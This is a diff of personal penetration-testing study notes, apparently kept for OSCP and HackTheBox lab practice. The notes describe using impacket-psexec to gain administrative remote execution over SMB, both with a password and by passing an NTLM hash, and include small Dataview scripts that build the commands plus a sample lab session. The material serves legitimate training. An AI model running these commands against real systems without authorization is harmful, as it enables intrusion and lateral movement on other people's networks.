@@ -1,7 +1,18 @@
 To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:
 
   Attacking SMB
-  
+
+Now that we have these credentials we can run `psexec.py`. This `impacket` tool requires 3 things. The user needs to be a local admin on the target machine, it must have SMB open, and they must have administrative privileges to the default `IPC$` share.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";const discoveredDomain = page?.["Discovered Web Domain"] ?? "NO DOMAIN FOUND";
+
+const command = `impacket-psexec ${discoveredDomain}/Administrator:'[PW}'@${ip}`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+```shell-session
+Retric@htb[/htb]$ impacket-psexec domain/administrator:'Password123!'@10.10.110.17
+```
 ## Pass the hash psexec
 
 FULL HASH LMHASH:NTHASH
@@ -12,13 +23,6 @@ const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP
 const command = `impacket-psexec ${discoveredDomain}/Administrator@${ip} -hashes [hash]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
-```
----
-
-# Normal 
-
-```shell-session
-Retric@htb[/htb]$ impacket-psexec domain/administrator:'Password123!'@10.10.110.17
 ```
 
 ---
